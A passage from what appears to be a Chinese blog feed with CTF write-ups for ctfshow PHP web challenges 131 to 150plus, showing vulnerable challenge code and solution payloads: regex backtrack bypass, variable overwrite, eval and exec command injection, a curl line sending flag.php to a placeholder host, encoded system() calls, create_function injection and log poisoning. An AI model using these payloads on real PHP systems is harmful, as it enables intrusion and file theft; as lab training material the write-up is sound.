class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-13 05:19:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考察点：利用正则最大回溯次数绕过<br>看到本题，要想办法绕过preg_match（）或stripos（）<br>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=<span class="string">&quot;http://03771c3c-6afb-4457-a719-19cc6ccf922e.chall.ctf.show/&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看了一下羽师傅的WP，原来还能数组绕过。。。是个非预期</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>stripos应用于数组的时候会返回null，null!==false，所以非预期了<br>又看了一眼hint，我又震惊了：f=ctfshow。发生甚么事了？<br>又查了一下，原来对这正则表达式的理解还是不太对：/.+?ctfshow/is<br>在/s模式下，.匹配任意字符，+表示重复一次或更多次，没错是至少一次！而后面加个?表示懒惰模式，+?表示重复1次或更多次，但尽可能少重复。当然懒惰模式并不影响解题思路，总之就是ctfshow前面必须得有字符才能匹配到，所以直接f=ctfshow就可以了。</p><h2 id="web-132"><a href="#web-132" class="headerlink" title="web 132"></a>web 132</h2><p>本题首先进入题目页面，在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin</span><br></pre></td></tr></table></figure><p>之后看到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$code</span> === mt_rand(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br></pre></td></tr></table></figure><p>原理不太清楚，但是师傅们说<br>只需让后面成立即username，则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=admin&amp;password=<span class="number">1</span>&amp;username=admin</span><br></pre></td></tr></table></figure><h2 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看师傅们的解题：<br>举个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">get传参   F=`<span class="variable">$F</span> `;sleep <span class="number">3</span></span><br><span class="line">经过substr(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>)截取后 得到  `<span class="variable">$F</span> `;</span><br><span class="line">也就是会执行 <span class="keyword">eval</span>(<span class="string">&quot;`<span class="subst">$F</span> `;&quot;</span>);</span><br><span class="line">我们把原来的<span class="variable">$F</span>带进去</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;``<span class="subst">$F</span> `;sleep 3`&quot;</span>);</span><br><span class="line">也就是说最终会执行  `   `<span class="variable">$F</span> `;sleep <span class="number">3</span>  ` == shell_exec(<span class="string">&quot;`<span class="subst">$F</span> `;sleep 3&quot;</span>);</span><br><span class="line">前面的命令我们不需要管，但是后面的命令我们可以自由控制。</span><br><span class="line">这样就在服务器上成功执行了 sleep <span class="number">3</span></span><br><span class="line">所以 最后就是一道无回显的RCE题目了</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>无回显我们可以用反弹shell 或者curl外带 或者盲注<br>这里的话反弹没有成功，但是可以外带。（由于外带没有成功，就举例第二种利用burpsuit的方法）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: curl -X POST -F xx=@flag.php http:<span class="comment">//xxx</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/e99f6358d5cc484f9de297a0842a3c8b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="得到flag"><br>得flag</p><h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@parse_str(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考察POST变量覆盖<br>yu师傅做了个测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parse_str(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">var_dump(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后我们传入 _POST[‘a’]=123<br>会发现输出的结果为array(1) { [“‘a’”]=&gt; string(3) “123” }<br>也就是说现在的$_POST[‘a’]存在并且值为123</p><p>题目中还有个extract($_POST)<br>这样的话 $a==123</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_POST[key1]=<span class="number">36</span>d&amp;_POST[key2]=<span class="number">36</span>d</span><br></pre></td></tr></table></figure><h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这道题和前面得相似，他把curl给过滤了<br>看yu师傅得操作，想到了重定向</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?F=`<span class="variable">$F</span> `;nl f*&gt;xxx</span><br></pre></td></tr></table></figure><h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    check(<span class="variable">$c</span>);</span><br><span class="line">    exec(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本题过滤了许多东西，同时如果直接ls将不会回显，因此利用linux上的tee命令来写文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls /|tee <span class="number">111</span></span><br></pre></td></tr></table></figure><p>之后发现在f149_15_h3r3个下面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=cat /f149_15_h3r3|tee <span class="number">111</span></span><br></pre></td></tr></table></figure><p>得flag</p><h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-16 22:27:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">call_user_func(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>call_user_funchan函数得简单回调<br>（把他想复杂了，想成_walkup的绕过）<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure><h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><p>本题关键call_user_func（）的使用<br>call_user_func中不但可以传字符串也可以传数组<br>例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="keyword">array</span>(<span class="variable">$classname</span>, <span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line">这时候会调用 classname中的 say_hello方法</span><br></pre></td></tr></table></figure><p>则payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow[<span class="number">0</span>]=ctfshow&amp;ctfshow[<span class="number">1</span>]=getFlag</span><br></pre></td></tr></table></figure><h2 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h2><p>盲注，暂时先过</p><h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><p>intval会将非数字字符转换为0，也就是说 intval(‘a’)==0 intval(‘.’)==0 intval(‘/‘)==0<br>则将有很多解法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f1=md5&amp;f2=end</span><br></pre></td></tr></table></figure><h2 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>)</span><br></pre></td></tr></table></figure><p>^是表示正则表达式的开始，$表示正则表达式的结束，\w表示任意大小写字母或数字或下划线，+号表示1到多个\w</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-17 19:28:09</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>制作命令eval(“return phpinfo();”)<br>因此v3肯定是命令执行，但是v1v2又怎么弄呢？PHP里面数字是可以和一些命令进行运算，例如1-phpinfo()-1，这样仍然可以执行phpinfo()，因此构造就很明显了。中单的v3用无数字字母rce就可以。</p><blockquote><p>运行取反脚本构造system(‘tac f*’)得到<br>(<del>%8C%86%8C%8B%9A%92)(</del>%8B%9E%9C%DF%99%D5);</p></blockquote><p>（<a href="https://blog.csdn.net/miuzzx/article/details/109143413">yu师傅取反脚本</a>）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v3=-(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">8</span>B%<span class="number">9</span>E%<span class="number">9</span>C%DF%<span class="number">99</span>%D5);-&amp;v2=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>好像异或和或不能用（反正我是没有成功）</p><h2 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-17 19:36:02</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>))&#123;</span><br><span class="line">        <span class="variable">$d</span> = (<span class="keyword">int</span>)(<span class="variable">$v1</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        sleep(<span class="variable">$d</span>);</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很简单，直接<br>v1=0，如果等于1你将需要等到0x36d * 0x36d * 0x36d * 0x36d * 0x36d这么久才有回显</p><h2 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h2><p>本题用web141的异或脚本即可解决</p><h2 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h2><p>和141一样，但注意要看清v1v2v3的位置！！！</p><h2 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h2><p>本题把*和-和+都过滤了，没思路，看大佬博客<br>发现除了上述的符号还可以使用以下的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="number">1</span>&amp;v3=|(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">8</span>B%<span class="number">9</span>E%<span class="number">9</span>C%DF%<span class="number">99</span>%D5)|</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="number">1</span>&amp;v3=?(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">8</span>B%<span class="number">9</span>E%<span class="number">9</span>C%DF%<span class="number">99</span>%D5):</span><br></pre></td></tr></table></figure><h2 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h2><p>第二个被ban，因此用上一题的第一个</p><h2 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h2><p>本题利用create_function函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&#x27;echo $a.&quot;123&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">类似于</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;123&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么如果我们第二个参数传入 }phpinfo();//<br>就等价于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  &#125;phpinfo();<span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line">从而执行phpinfo()命令</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>详细可以看<a href="https://paper.seebug.org/755/">这篇文章</a><br>则paylaod</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET：?show=&#125;system(<span class="string">&#x27;tac flag.php&#x27;</span>);<span class="comment">//</span></span><br><span class="line">POST：ctf=\create_function</span><br></pre></td></tr></table></figure><h2 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h2><p>没有过滤异或，直接异或</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(<span class="string">&quot;%08%02%08%09%05%0d&quot;</span>^<span class="string">&quot;%7b%7b%7b%7d%60%60&quot;</span>)(<span class="string">&quot;%09%01%03%01%06%02&quot;</span>^<span class="string">&quot;%7d%60%60%21%60%28&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h2><blockquote><p>scandir（）：读取（）内路径下的文件<br>unlink（）：删除文件</p></blockquote><p>传🐎到index.php或进行条件竞争</p><h2 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h2><p>令isvip为true之后现在日志中传入一句话（即在user-agent中加入）<br>之后访问日志<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf=/<span class="keyword">var</span>/log/nginx/access.log&amp;a=system(<span class="string">&quot;tac flag.php&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="web150plus"><a href="#web150plus" class="headerlink" title="web150plus"></a>web150plus</h2><p>知识点</p><blockquote><p>_可以用..来代替<br>__autoload（）：进行类判断时被调用</p></blockquote><p>则payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?..CTFSHOW..=phpinfo</span><br></pre></td></tr></table></figure><p>flag在phpinfo中</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow web入门 命令执行</title>
      <link href="/2022/01/07/ctfshow%20web%E5%85%A5%E9%97%A855_122%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2022/01/07/ctfshow%20web%E5%85%A5%E9%97%A855_122%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
